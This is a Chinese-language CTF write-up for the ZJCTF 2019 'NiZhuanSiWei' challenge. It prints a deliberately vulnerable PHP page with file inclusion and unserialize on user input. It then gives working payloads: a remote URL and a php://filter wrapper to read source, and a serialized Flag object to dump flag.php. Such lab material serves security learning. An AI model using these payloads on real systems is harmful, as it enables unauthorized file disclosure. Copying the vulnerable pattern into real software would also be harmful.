# [ZJCTF 2019]NiZhuanSiWei

1. 打开页面显示一段php代码

```php
 <?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?> 
```



2. 审计

- 接收三个Get参数text、file、password
- $text不能为空
- 获取$text文件的内容必须等于*welcome to the zjctf*
- $file不能存在**flag**关键词
- 包含$file文件（提示*useless.php*），反序列化$password的内容



3. 尝试构造payload

使用远程文件绕过text检测，使用`php://filter`过滤器读取useless.php源代码

```
/?text=http://truda.free.beeceptor.com&file=php://filter/read=convert.base64-encode/resource=useless.php&password=666
```

![image-20211011135709622](https://i.loli.net/2021/10/11/YT6UmuPf5tcxSXG.png)



解码得到：

```php
<?php  

class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>
```



4. 构造反序列化

完整Payload

```php
/?text=http://truda.free.beeceptor.com&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```

![image-20211011142204033](https://i.loli.net/2021/10/11/EMKIC83rtqBGjwV.png)



Get Flag!